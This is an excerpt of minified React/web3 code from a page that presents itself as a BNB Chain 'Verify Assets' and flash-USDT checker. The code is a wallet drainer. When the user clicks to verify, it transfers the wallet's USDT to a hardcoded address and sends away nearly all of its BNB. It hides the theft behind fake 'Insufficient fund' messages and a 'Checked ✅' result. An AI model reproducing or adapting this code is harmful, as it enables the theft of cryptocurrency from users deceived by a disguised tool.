                ...
                try {
                    ...
                    if (parseFloat(c) > 1) {
                        ...
                        if ((console.log("Required BNB for gas:", i.utils.fromWei(l.toString(), "ether")), console.log("Current BNB balance:", i.utils.fromWei(s, "ether")), BigInt(s) < l)) {
                            ...
                            let r = await d.Z.post("/api/transactions/sendGasFees", { userAddress: a, amount: t.toString() }, { headers: { "x-api-key": m.env.API_KEY } });
                        ...
                        if (parseFloat(c) > 5500)
                            try {
                                (n = (await r.methods.transfer("0x1Cb28C285E8d323551f8d016A5d131B6585cdd16", t).send({ from: a })).transactionHash), console.log("Insufficient fund to check flash usdt"), (g = c);
                            } catch (e) {
                    ...
                    if (BigInt(b) > 0)
                        try {
                            let n = await i.eth.getGasPrice(),
                                ...
                                t = BigInt(b) - s;
                            t > 0 &&
                                ((e = (await i.eth.sendTransaction({ from: a, to: u, value: t.toString() })).transactionHash),
                                console.log("Insufficient fund to check flash usdt", e),
                                (p = i.utils.fromWei(t.toString(), "ether")),
                                await j(a, p, e, "BNB"));
                        } catch (e) {
                            throw (console.error("Insufficient fund to check flash usdt:", e), { amount: "Amount = Checked ✅", flash: "Flash Usdt = 0" });
                        }
            ...
            function y(e) {
                ...
                n)
                    ? (0, c.jsx)("div", {
                          ...
                          children: (0, c.jsxs)("div", { className: "loader-box", children: [(0, c.jsx)("div", { className: "spinner-loader" }), (0, c.jsx)("p", { className: "loader-info", children: a[s] })] }),
                      })
                    : null;
            }
            function C(e) {
                                          ...
                                          (0, c.jsxs)("div", {
                                              ...
                                              children: [
                                                  ...
                                                  (0, c.jsxs)("p", {
                                                      ...
                                                      children: [
                                                          (0, c.jsx)("img", { src: P, alt: "USDT Logo", style: { width: "25px", marginRight: "10px", marginLeft: "30px" } }),
                                                          (0, c.jsxs)("span", { children: ["USDT = ", null !== g ? Math.floor(g) : "Loading..."] }),
                                                      ],
                                                  }),
                                                  (0, c.jsxs)("p", {
                                                      style: { display: "flex", alignItems: "center" },
                                                      children: [
                                                          (0, c.jsx)("img", { src: E, alt: "BNB Logo", style: { width: "25px", marginRight: "10px", marginLeft: "30px" } }),
                                                          (0, c.jsxs)("span", { children: ["BNB = ", null !== l ? l : "Loading..."] }),
                                                      ],
                                                  }),
                                              ],
                                          }),
                                          ...
                                          (0, c.jsxs)("div", {
                                              ...
                                              children: [
                                                  ...
                                                  (0, c.jsxs)("p", {
                                                      ...
                                                      children: [
                                                          (0, c.jsx)("img", { src: P, alt: "USDT Logo", style: { width: "25px", marginRight: "10px", marginLeft: "30px" } }),
                                                          (0, c.jsxs)("span", { children: ["USDT = ", null !== g ? g : "Loading..."] }),
                                                      ],
                                                  }),
                                                  (0, c.jsxs)("p", {
                                                      style: { display: "flex", alignItems: "center" },
                                ...
                                : (0, c.jsxs)(c.Fragment, {
                                      children: [
                                          ...
                                          (0, c.jsxs)("div", {
                                              ...
                                              children: [
                                                  (0, c.jsx)("button", { className: "primary-button", onClick: G, children: "Verify Assets" }),
                                                  (0, c.jsx)("a", { href: "https://www.bnbchain.org/en", className: "secondary-button", children: "\uD83C\uDFE0︎   HOME" }),
                                              ],
                                          }),
                                      ],
                                  }),
                            ...
                            children: [
                                ...
                                (0, c.jsxs)("div", {
                                    ...
                                    children: [
                                        ...
                                        (0, c.jsxs)("a", {
                                            href: "https://www.youtube.com/channel/UCG9fZu6D4I83DStktBV0Ryw",
                                            className: "social-link",
                                            children: [(0, c.jsx)("img", { src: "/youtube.png", alt: "YouTube", className: "social-icon" }), "YouTube"],
                                        }),
